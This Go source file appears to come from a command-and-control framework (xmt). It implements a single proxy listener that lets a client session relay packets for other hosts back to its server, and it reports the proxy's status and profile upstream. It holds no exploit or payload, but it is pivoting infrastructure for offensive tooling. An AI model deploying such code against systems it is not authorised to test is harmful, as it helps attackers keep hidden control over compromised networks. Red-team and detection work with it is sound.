//go:build !multiproxy && !noproxy

package c2

import (
	"context"
	"io"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

type proxyBase struct {
	*Proxy
}

func (s *Session) updateProxyStats() { // old: (_ bool, _ string) {
	// Just update the server with our Proxy info.
	if !s.IsClient() || !s.IsActive() {
		return
	}
	n := &com.Packet{ID: SvProxy, Device: local.UUID}
	switch {
	case s.proxy == nil:
		n.WriteUint8(0)
	case !s.proxy.IsActive():
		s.proxy = nil
		n.WriteUint8(0)
	default:
		n.WriteUint8(1)
		n.WriteString(s.proxy.addr)
		n.WriteString(s.proxy.name)
	}
	s.queue(n)
}

// Proxy returns the current Proxy (if enabled). This function take a name
// argument that is a string that specifies the Proxy name.
//
// By default, the name is ignored as multiproxy support is disabled.
//
// When proxy support is disabled, this always returns nil.
func (s *Session) Proxy(_ string) *Proxy {
	if s.proxy == nil {
		return nil
	}
	return s.proxy.Proxy
}
func (s *Session) checkProxyMarshal() bool {
	if s.proxy == nil {
		return true
	}
	_, ok := s.proxy.p.(marshaler)
	return ok
}
func (s *Session) writeProxyInfo(w io.Writer, d *[8]byte) error {
	if s.proxy == nil || !s.proxy.IsActive() {
		(*d)[0] = 0
		return writeFull(w, 1, (*d)[0:1])
	}
	n, v := uint64(len(s.proxy.addr)), uint64(len(s.proxy.name))
	(*d)[0], (*d)[1], (*d)[2], (*d)[3], (*d)[4] = 1, byte(n>>8), byte(n), byte(v>>8), byte(v)
	if err := writeFull(w, 4, (*d)[0:4]); err != nil {
		return err
	}
	if err := writeFull(w, len(s.proxy.addr), []byte(s.proxy.addr)); err != nil {
		return err
	}
	if err := writeFull(w, len(s.proxy.name), []byte(s.proxy.name)); err != nil {
		return err
	}
	p, ok := s.proxy.p.(marshaler)
	if !ok {
		return xerr.Sub("cannot marshal Proxy Profile", 0x54)
	}
	b, err := p.MarshalBinary()
	if err != nil {
		return err
	}
	return writeSlice(w, d, b)
}

// NewProxy establishes a new listening Proxy connection using the supplied Profile
// name and bind address that will send any received Packets "upstream" via the
// current Session.
//
// Packets destined for hosts connected to this proxy will be routed back and
// forth on this Session.
//
// This function will return an error if this is not a client Session or
// listening fails.
func (s *Session) NewProxy(name, addr string, p Profile) (*Proxy, error) {
	if !s.IsClient() {
		return nil, xerr.Sub("must be a client session", 0x4E)
	}
	if s.isMoving() {
		return nil, xerr.Sub("migration in progress", 0x4F)
	}
	// TODO(dij): Need to enable this, but honestly its a lot of work for
	//            something that might have 0 use.
	//
	//            People, if you feel otherwise, put in a GitHub issue plz.
	//
	// NOTE(dij): Build with the "multiproxy" tag to remove this restriction
	if s.proxy != nil {
		return nil, xerr.Sub("only a single Proxy per session can be active", 0x55)
	}
	if p == nil {
		return nil, ErrInvalidProfile
	}
	h, w, t := p.Next()
	if len(addr) > 0 {
		h = addr
	}
	if len(h) == 0 {
		return nil, ErrNoHost
	}
	l, err := p.Listen(s.ctx, h)
	if err != nil {
		return nil, xerr.Wrap("unable to listen", err)
	}
	if l == nil {
		return nil, xerr.Sub("unable to listen", 0x49)
	}
	v := &Proxy{
		ch:         make(chan struct{}),
		name:       name,
		addr:       h,
		close:      make(chan uint32, 8),
		parent:     s,
		clients:    make(map[uint32]*proxyClient),
		listener:   l,
		connection: connection{s: s.s, p: p, w: w, m: s.m, t: t, log: s.log},
	}
	if v.ctx, v.cancel = context.WithCancel(s.ctx); cout.Enabled {
		s.log.Info("[%s/P] Added Proxy Listener on %q!", s.ID, h)
	}
	s.proxy = &proxyBase{v}
	s.updateProxyStats() // true, name)
	go v.listen()
	return v, nil
}
